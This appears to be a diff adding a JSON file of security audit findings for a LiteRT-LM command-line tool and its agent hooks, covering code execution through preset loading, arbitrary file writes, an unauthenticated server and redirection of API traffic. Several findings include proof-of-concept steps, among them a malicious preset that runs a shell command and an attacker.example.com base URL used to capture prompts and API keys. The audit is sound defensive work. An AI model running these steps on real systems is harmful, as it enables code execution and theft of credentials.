@@ -1,0 +1,114 @@
+[
+  {
+    "severity": "HIGH",
+    "location": "python/litert_lm_cli/model.py",
+    "title": "Arbitrary Code Execution via Unsandboxed Preset Loading",
+    "description": "The `load_preset()` function uses `importlib.util.spec_from_file_location` and `spec.loader.exec_module` to execute an arbitrary Python file specified by the `--preset` CLI option. There is no validation that the file originates from a trusted location, no sandboxing of the executed code, and no user warning that full Python code will be run. An attacker who can influence the preset path (e.g., via a workflow script, symlink attack, or social engineering) obtains full code execution in the context of the running process.",
+    "impact": "Full arbitrary code execution with the privileges of the user running the CLI. The loaded module's attributes are used as tool functions and system instructions, giving the attacker control over the model's tool execution pipeline.",
+    "attack_path": "1. Attacker places a malicious Python file at a predictable or attacker-writable path (e.g., /tmp/preset.py, a shared network mount, or a cloned repo with a poisoned preset file). 2. Victim runs `litert-lm run --preset /tmp/preset.py` (or a CI/CD script does so with a user-provided path). 3. `load_preset()` calls `spec.loader.exec_module(user_tools)` which executes all top-level code in the attacker's file. 4. Attacker's code runs with full process privileges — can exfiltrate env vars, API keys, or establish reverse shells.",
+    "evidence": [
+      "python/litert_lm_cli/model.py:74 — spec = importlib.util.spec_from_file_location('user_tools', preset)",
+      "python/litert_lm_cli/model.py:79 — user_tools = importlib.util.module_from_spec(spec)",
+      "python/litert_lm_cli/model.py:80 — spec.loader.exec_module(user_tools)",
+      "python/litert_lm_cli/model.py:274 — tools, messages, extra_context = load_preset(preset)"
+    ],
+    "remediation": "1. Validate that the preset file path is within a trusted directory (e.g., the project root or a dedicated presets directory). 2. Warn the user before executing external code. 3. Consider a declarative preset format (YAML/JSON) for tool definitions instead of arbitrary Python execution. 4. If Python execution is required, document the trust model and restrict paths to user-owned directories.",
+    "poc_video_notes": "Create a file /tmp/evil_preset.py containing `import os; os.system('id > /tmp/pwned.txt')`, then run `litert-lm run --preset /tmp/evil_preset.py --model <any_model>`. Observe /tmp/pwned.txt is created before the model even loads."
+  },
+  {
+    "severity": "HIGH",
+    "location": "tools/agent_hooks/dpm_gate.py",
+    "title": "Arbitrary File Write via Environment Variable-Controlled Project Root",
+    "description": "The `project_root()` function reads from four different environment variables (`CLAUDE_PROJECT_DIR`, `GEMINI_PROJECT_DIR`, `CURSOR_PROJECT_DIR`, `COPILOT_WORKSPACE_DIR`) without validating the resolved path. Functions `save_state()`, `append_ledger()`, and `write_active_context()` then create directories and write files under `<project_root>/.dpm-agent-hooks/`. Since the hook reads JSON from stdin (via `read_event_stdin()`) and the written content includes attacker-influenced data (correction texts, prompts, tool inputs), an attacker who controls any of these env vars can write attacker-influenced content to arbitrary filesystem locations.",
+    "impact": "An attacker can write structured JSON (state.json, ledger.jsonl) and Markdown (ACTIVE_CONTEXT.md) containing attacker-controlled correction text and prompt data to arbitrary directories. This can be leveraged for: (1) Overwriting configuration files in sensitive directories, (2) Planting files in web-serving directories, (3) Clobbering files if the .dpm-agent-hooks/ directory already exists in a targeted location.",
+    "attack_path": "1. Attacker sets `CLAUDE_PROJECT_DIR=/etc` (or another sensitive location) in the environment before the hook is invoked. 2. Attacker pipes a crafted JSON event to the hook via stdin containing a correction prompt with payload content. 3. `project_root()` resolves to `/etc`, `state_dir()` returns `/etc/.dpm-agent-hooks/`. 4. `save_state()` creates `/etc/.dpm-agent-hooks/state.json` with attacker-influenced correction data. 5. `append_ledger()` writes to `/etc/.dpm-agent-hooks/ledger.jsonl`. 6. `write_active_context()` writes to `/etc/.dpm-agent-hooks/ACTIVE_CONTEXT.md`.",
+    "evidence": [
+      "tools/agent_hooks/dpm_gate.py:60-68 — project_root() reads unsanitized env vars",
+      "tools/agent_hooks/dpm_gate.py:71-72 — state_dir returns root / '.dpm-agent-hooks'",
+      "tools/agent_hooks/dpm_gate.py:96-97 — save_state creates parent dirs with mkdir(parents=True)",
+      "tools/agent_hooks/dpm_gate.py:107-108 — append_ledger creates parent dirs with mkdir(parents=True)",
+      "tools/agent_hooks/dpm_gate.py:222-271 — extract_correction builds content from attacker-controlled prompt"
+    ],
+    "remediation": "1. Validate that `project_root()` resolves to a directory that contains a known project marker (e.g., `.git/`, `package.json`, etc.) before writing state files. 2. Use `os.path.realpath()` and check that the resolved path is not a symlink escape or a sensitive system directory. 3. Restrict the state directory to the user's home directory or a well-known application data path (e.g., `~/.dpm-agent-hooks/<project-hash>/`). 4. Sanitize correction text before writing to files.",
+    "poc_video_notes": "Set CLAUDE_PROJECT_DIR=/tmp/target, run `echo '{\"hook_event_name\":\"UserPromptSubmit\",\"prompt\":\"correction: replace old_value with new_value\"}' | python dpm_gate.py --agent claude`. Observe files created under /tmp/target/.dpm-agent-hooks/."
+  },
+  {
+    "severity": "MEDIUM",
+    "location": "python/litert_lm_cli/serve.py",
+    "title": "Unauthenticated HTTP API Server with Internal Error Disclosure",
+    "description": "The Gemini-compatible HTTP server (`GeminiHandler`) has no authentication, authorization, or rate-limiting mechanisms. Any process or network client that can reach the server can load arbitrary models (by specifying different model_ids in the URL path), run inference, and observe internal error details. The error handler on line 302-308 passes raw exception messages to `send_error()`, which can leak internal file paths, model configuration details, and stack trace information to unauthenticated clients.",
+    "impact": "1. Unauthorized inference: any local or network-reachable client can consume compute resources by sending inference requests. 2. Information disclosure: error responses include raw Python exception strings that may reveal internal paths, model details, or system configuration. 3. Model enumeration: clients can probe different model_ids to discover which models are available. 4. Resource exhaustion: no rate limiting allows denial-of-service via request flooding.",
+    "attack_path": "1. Server is started with `litert-lm serve --host 0.0.0.0` (or even on localhost, other local processes can access it). 2. Attacker sends POST requests to `/v1beta/models/<model_id>:generateContent` with arbitrary model_ids. 3. For non-existent models, the 404 response leaks the model path format. 4. For existing models, the attacker can run unlimited inference. 5. Malformed requests trigger 500 errors with raw exception details.",
+    "evidence": [
+      "python/litert_lm_cli/serve.py:172 — class GeminiHandler(http.server.BaseHTTPRequestHandler) — no auth",
+      "python/litert_lm_cli/serve.py:302-308 — except block passes str(e) to send_error(500, ...)",
+      "python/litert_lm_cli/serve.py:311-314 — run_server has no auth configuration",
+      "python/litert_lm_cli/serve.py:209 — send_error(500, f'Failed to load engine: {e}') leaks internal errors"
+    ],
+    "remediation": "1. Add API key or bearer token authentication. 2. Sanitize error messages before returning them to clients — never expose raw exception details. 3. Add rate limiting per client IP. 4. Default to localhost-only binding and warn when binding to 0.0.0.0. 5. Restrict model_ids to a configured allowlist rather than allowing arbitrary model loading.",
+    "poc_video_notes": "Start the server with `litert-lm serve --host 0.0.0.0`, then from another machine run `curl -X POST http://<host>:9379/v1beta/models/nonexistent:generateContent -d '{}'` to observe internal error details in the response."
+  },
+  {
+    "severity": "MEDIUM",
+    "location": "tools/benchmarks/dpm_phase3_bench/openai_compat_adapter.py",
+    "title": "Server-Side Request Forgery via Configurable Base URL",
+    "description": "The `OpenAICompatModelAdapter` sends HTTP requests to a URL derived from `OPENAI_COMPAT_BASE_URL` or `OPENAI_BASE_URL` environment variables (or constructor args) without validating the target is an expected API endpoint. In shared compute environments (CI/CD pipelines, shared dev servers), an attacker who can set these environment variables can redirect all API traffic to an attacker-controlled server, capturing prompts and API keys, or to internal network services (SSRF). The adapter also falls back to `api_key = 'EMPTY'` when no key is configured, meaning it silently proceeds with no authentication — masking the fact that requests are being sent to a potentially malicious endpoint.",
+    "impact": "1. SSRF: requests can be directed to internal services (cloud metadata endpoints, internal APIs) accessible from the compute environment. 2. Credential theft: if `OPENAI_API_KEY` is also set, the API key is sent to the attacker-controlled endpoint. 3. Data exfiltration: all benchmark prompts (which may contain sensitive session data from fixtures) are sent to the redirected endpoint. 4. Silent misconfiguration: the 'EMPTY' fallback key means no error is raised when the adapter is misconfigured.",
+    "attack_path": "1. In a shared CI/CD environment, attacker sets `OPENAI_COMPAT_BASE_URL=http://attacker.example.com/v1` and `BENCH_USE_OPENAI_COMPAT=1`. 2. Benchmark runner instantiates `OpenAICompatModelAdapter`, which creates an OpenAI client pointing to the attacker's server. 3. Every `generate()` call sends the full prompt content (including session event logs) and any configured API key to the attacker. 4. The attacker's server returns valid-looking responses, and the benchmark completes normally — the exfiltration is invisible.",
+    "evidence": [
+      "tools/benchmarks/dpm_phase3_bench/openai_compat_adapter.py:53-58 — api_key falls back to 'EMPTY'",
+      "tools/benchmarks/dpm_phase3_bench/openai_compat_adapter.py:59-64 — base_url from env vars without validation",
+      "tools/benchmarks/dpm_phase3_bench/openai_compat_adapter.py:73 — OpenAI client created with arbitrary base_url",
+      "tools/benchmarks/dpm_phase3_bench/openai_compat_adapter.py:109 — chat.completions.create sends prompt to configured URL"
+    ],
+    "remediation": "1. Validate base_url against an allowlist of expected domains/IP ranges (e.g., localhost, known API endpoints). 2. Warn loudly when using a non-standard base_url. 3. Do not default api_key to 'EMPTY' — raise an error or at minimum log a warning when no key is configured. 4. Block requests to cloud metadata endpoints (169.254.169.254, fd00::, etc.).",
+    "poc_video_notes": "Start a simple HTTP echo server on port 8080. Set `OPENAI_COMPAT_BASE_URL=http://localhost:8080/v1` and `BENCH_USE_OPENAI_COMPAT=1`. Run the benchmark and observe all prompts arriving at the echo server."
+  },
+  {
+    "severity": "MEDIUM",
+    "location": "tools/benchmarks/dpm_phase3_bench/anthropic_adapter.py",
+    "title": "API Key Exposure via Hardcoded Developer-Specific .env Path",
+    "description": "The `_load_dotenv_if_available()` function loads environment variables from three candidate .env files, including the hardcoded path `/c/Users/mac/.env`. This path: (1) Leaks a developer's Windows username in the source code, (2) On a shared system, any user who can create this path can inject arbitrary environment variables (including `ANTHROPIC_API_KEY`) that will be loaded by any user running the adapter, (3) On Windows with multiple user profiles, this creates a cross-user trust boundary violation where one user's .env file is read by another user's process.",
+    "impact": "1. Information disclosure: the developer username 'mac' is exposed in source code. 2. Environment variable injection: on a shared system, an attacker who creates `/c/Users/mac/.env` (or its real equivalent on the target OS) can inject `ANTHROPIC_API_KEY` and other environment variables into any process that imports this adapter. 3. API key theft: if a legitimate .env file exists at this hardcoded path with a real API key, any user or process that imports this module will have access to it.",
+    "attack_path": "1. Attacker identifies that `/c/Users/mac/.env` is hardcoded in the adapter. 2. On a shared Windows machine or cross-platform mount where this path is writable, attacker creates `/c/Users/mac/.env` with `ANTHROPIC_API_KEY=sk-ant-<attacker-controlled-key>`. 3. Victim imports `anthropic_adapter.py` — `_load_dotenv_if_available()` loads the attacker's .env file. 4. The adapter creates an Anthropic client with the attacker's API key, routing all API calls through the attacker's account (where prompts/completions are logged).",
+    "evidence": [
+      "tools/benchmarks/dpm_phase3_bench/anthropic_adapter.py:59-69 — _load_dotenv_if_available function",
+      "tools/benchmarks/dpm_phase3_bench/anthropic_adapter.py:64 — Path('/c/Users/mac/.env') hardcoded",
+      "tools/benchmarks/dpm_phase3_bench/anthropic_adapter.py:88 — _load_dotenv_if_available() called in __init__"
+    ],
+    "remediation": "1. Remove the hardcoded path `/c/Users/mac/.env` — this is developer-specific and should never be in source control. 2. Only load .env files from the current working directory or well-known config locations (e.g., `Path.home() / '.env'`). 3. Add a warning when loading .env files from paths not owned by the current user. 4. Consider using a more structured configuration system rather than dotenv for API key management.",
+    "poc_video_notes": "On a shared system, create the file at the hardcoded path with `ANTHROPIC_API_KEY=sk-test-attacker-key`. Import the adapter module and verify the client uses the injected key."
+  },
+  {
+    "severity": "MEDIUM",
+    "location": "python/litert_lm_eval/litert_lm_eval.py",
+    "title": "Unvalidated Keyword Arguments Passed to Evaluation Framework",
+    "description": "The evaluation runner uses `argparse.parse_known_args()` to split arguments into known and unknown, then passes the unknown arguments as `**kwargs` to `lm_eval.simple_evaluate()`. The `utils.parse_unknown_args()` function converts arbitrary CLI flags into a dictionary with basic type coercion. This allows a user (or script) to inject arbitrary keyword arguments into the evaluation framework, potentially controlling output paths, enabling debug modes, or triggering unintended behavior in the downstream `lm_eval` library.",
+    "impact": "1. Arbitrary file write: if `lm_eval.simple_evaluate()` accepts parameters like `output_base_path` or `log_samples_suffix`, an attacker can write evaluation results to arbitrary paths. 2. Evaluation manipulation: unexpected kwargs could alter evaluation behavior (number of samples, scoring, etc.) in ways not intended by the script's author. 3. Security boundary bypass: the explicit CLI flags are meant to be the controlled interface, but the escape hatch bypasses all validation.",
+    "attack_path": "1. A CI/CD pipeline runs the evaluation script with user-controlled arguments. 2. Attacker passes `--write_out --output_base_path /sensitive/path --log_samples` along with the normal flags. 3. `parse_known_args` does not recognize these, so they go to `unknown`. 4. `parse_unknown_args` converts them to `{'write_out': True, 'output_base_path': '/sensitive/path', 'log_samples': True}`. 5. These are passed as `**kwargs` to `lm_eval.simple_evaluate()`, which may honor them, writing detailed evaluation data to an attacker-specified path.",
+    "evidence": [
+      "python/litert_lm_eval/litert_lm_eval.py:100 — args, unknown = parser.parse_known_args()",
+      "python/litert_lm_eval/litert_lm_eval.py:111 — kwargs = utils.parse_unknown_args(unknown)",
+      "python/litert_lm_eval/litert_lm_eval.py:121 — results = lm_eval.simple_evaluate(..., **kwargs)",
+      "python/litert_lm_eval/utils.py:20-67 — parse_unknown_args converts arbitrary flags to kwargs"
+    ],
+    "remediation": "1. Replace `parse_known_args` with `parse_args` to reject unknown arguments, or maintain an explicit allowlist of passthrough arguments. 2. If the escape hatch is intentional, document which lm_eval parameters are safe to pass through and validate against that list. 3. At minimum, log a warning when unknown arguments are being forwarded.",
+    "poc_video_notes": "Run the eval script with `--write_out --output_base_path /tmp/exfil` appended to the normal arguments. Verify that evaluation data is written to /tmp/exfil."
+  },
+  {
+    "severity": "MEDIUM",
+    "location": "tools/agent_hooks/dpm_gate.py",
+    "title": "Unbounded State Growth via Correction Accumulation Denial-of-Service",
+    "description": "The `merge_correction()` function appends corrections to the state without any upper bound. While `last_events` is capped at 20 entries (line 588), the `corrections` list grows without limit. Each correction contains attacker-influenced text fields (`correction_text` up to 1000 chars, `invalidated_facts`, `replacement_facts`). An attacker who can repeatedly trigger the `UserPromptSubmit` hook event with different correction-like prompts can cause unbounded growth of `state.json`, leading to: (1) disk exhaustion, (2) increasing latency in `load_state()` / `save_state()` / `active_corrections()` as the state file grows, (3) memory exhaustion when loading a large state file.",
+    "impact": "Denial of service via disk and memory exhaustion. Each unique correction prompt creates a new correction entry with a unique `correction_id` (SHA-256 based). The `active_corrections()` function iterates all corrections on every hook invocation, and `invalidated_hits()` checks every invalidated fact against every tool input — making the gate progressively slower.",
+    "attack_path": "1. Attacker sends thousands of distinct correction prompts via stdin to the hook (e.g., 'correction: replace X_N with Y_N' for N in 1..10000). 2. Each prompt generates a unique correction_id (due to different SHA-256 digests). 3. `merge_correction()` appends each as a new entry. 4. `state.json` grows to tens of megabytes. 5. Subsequent hook invocations become slow as `load_state()` parses the large JSON, and `invalidated_hits()` iterates thousands of facts per check.",
+    "evidence": [
+      "tools/agent_hooks/dpm_gate.py:291-298 — merge_correction appends without limit",
+      "tools/agent_hooks/dpm_gate.py:197-202 — active_corrections iterates all corrections",
+      "tools/agent_hooks/dpm_gate.py:336-343 — invalidated_hits iterates all active corrections and their facts",
+      "tools/agent_hooks/dpm_gate.py:588 — last_events capped at 20, but corrections are not capped"
+    ],
+    "remediation": "1. Add an upper bound on the number of corrections (e.g., 100) and evict the oldest when the limit is reached. 2. Add a maximum file size check for state.json. 3. Consider expiring corrections after a configurable TTL. 4. Index invalidated facts in a set for O(1) lookup instead of iterating all corrections.",
+    "poc_video_notes": "Write a loop that sends 1000 unique correction prompts to the hook via stdin. Measure the time for load_state() and invalidated_hits() before and after to demonstrate progressive slowdown."
+  }
+]
